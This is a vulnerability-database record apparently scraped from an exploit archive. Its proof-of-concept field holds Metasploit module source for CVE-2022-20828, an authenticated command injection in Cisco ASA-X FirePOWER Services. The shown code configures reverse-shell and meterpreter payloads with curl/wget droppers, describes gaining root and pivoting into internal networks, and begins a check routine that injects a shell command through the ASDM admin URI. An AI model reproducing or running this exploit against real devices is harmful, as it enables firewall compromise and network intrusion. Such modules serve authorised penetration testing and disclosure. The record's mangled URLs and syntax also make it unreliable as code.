{
    "text": "vul_url : ， vul_name : Cisco ASA-X With FirePOWER Services Authenticated Command Injection ， vul_date : 2022.09.06 ， vul_credit_name : jbaines-r7 ， vul_risk : High ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2022-20828 ， vul_cwe : CWE-78 ， vul_poc : ， # This module requires Metasploit: ， # Current source: ， class MetasploitModule < Msf:Exploit:Remote ， Rank = ExcellentRanking ， prepend Msf:Exploit:Remote:AutoCheck ， include Msf:Exploit:Remote:HttpClient ， include Msf:Exploit:CmdStager ， include Msf:Exploit:FileDropper ， super( ， update_info( ， info, ， 'Name' => 'Cisco ASA-X with FirePOWER Services Authenticated Command Injection', ， 'Description' => %q{ ， This module exploits an authenticated command injection vulnerability affecting ， Cisco ASA-X with FirePOWER Services. This exploit is executed through the ASA's ， ASDM web server and lands in the FirePower Services SFR module's Linux virtual ， machine as the root user. Access to the virtual machine allows the attacker to ， pivot to the inside network, and access the outside network. Also, the SFR ， virtual machine is running snort on the traffic flowing through the ASA, so ， the attacker should have access to this diverted traffic as well. ， This module requires ASDM credentials in order to traverse the ASDM interface. ， A similar attack can be performed via Cisco CLI (over SSH), although that isn't ， implemented here. ， Finally, it's worth noting that this attack bypasses the affects of the ， `lockdown-sensor` command (e.g. the virtual machine's bash shell shouldn't be ， available but this attack makes it available). ， Cisco assigned this issue CVE-2022-20828. The issue affects all Cisco ASA that ， support the ASA FirePOWER module (at least Cisco ASA-X with FirePOWER Service, ， and Cisco ISA 3000). The vulnerability has been patched in ASA FirePOWER module ， versions 6.2.3.19, 6.4.0.15, 6.6.7, and 7.0.21. The following versions will ， receive no patch: 6.2.2 and earlier, 6.3.*, 6.5.*, and 6.7.*. ， }, ， 'License' => MSF_LICENSE, ， 'Author' => [ ， 'jbaines-r7' # Vulnerability discovery and Metasploit module ， ], ， ' ， [ 'CVE', '2022-20828' ], ， [ 'URL', ' ], ， [ 'URL', ' ], ， [ 'URL', ' ， ], ， 'DisclosureDate' => '2022-06-22', ， 'Platform' => ['unix', 'linux'], ， 'Arch' => [ARCH_CMD, ARCH_X64,], ， 'Privileged' => true, ， 'Targets' => [ ， [ ， 'Shell Dropper', ， { ， 'Platform' => 'unix', ， 'Arch' => ARCH_CMD, ， 'Type' => :unix_cmd, ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_bash' ， } ， } ， ], ， [ ， 'Linux Dropper', ， { ， 'Platform' => 'linux', ， 'Arch' => ARCH_X64, ， 'Type' => :linux_dropper, ， 'CmdStagerFlavor' => [ 'curl', 'wget' ], ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp' ， } ， } ， ] ， ], ， 'DefaultTarget' => 1, ， 'DefaultOptions' => { ， 'RPORT' => 443, ， 'SSL' => true, ， 'MeterpreterTryToFork' => true ， }, ， 'Notes' => { ， 'Stability' => [CRASH_SAFE], ， 'Reliability' => [REPEATABLE_SESSION], ， 'SideEffects' => [ARTIFACTS_ON_DISK] ， } ， register_options([ ， OptString.new('TARGETURI', [true, 'Base path', '/']), ， OptString.new('USERNAME', [true, 'Username to authenticate with', ']), ， OptString.new('PASSWORD', [true, 'Password to authenticate with', ']), ， ]) ， end ， def check ， res = send_request_cgi({ ， 'method' => 'GET', ， 'uri' => normalize_uri(target_uri.path, '/admin/exec/session+sfr+do+`id`'), ， 'headers' => ， { ， 'User-Agent' => 'ASDM/ Java/1', ， 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) ， } ， })"
}